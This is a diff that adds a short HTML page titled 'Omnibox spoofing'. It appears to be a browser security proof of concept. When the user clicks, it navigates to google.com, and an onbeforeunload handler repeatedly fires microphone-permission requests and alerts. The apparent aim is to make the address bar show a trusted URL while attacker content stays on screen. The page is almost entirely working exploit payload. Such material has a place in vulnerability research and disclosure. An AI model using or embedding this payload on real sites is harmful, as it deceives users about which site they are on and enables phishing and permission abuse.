@@ -1,0 +1,24 @@
+
+<!DOCTYPE HTML>
+<html lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<input type="button" value="Click here" onclick="document.location='https://www.google.com'">
+	<title>Omnibox spoofing</title>
+	<script>
+		window.onbeforeunload = function() {
+			setInterval(function() {
+			  navigator.webkitGetUserMedia({audio: true}, function(){}, function(){});
+			   alert();
+			}, 0);
+		}
+	</script>
+</head>
+
+<body>
+	<center>
+		<br>
+	</center>
+</body>
+
+</html>
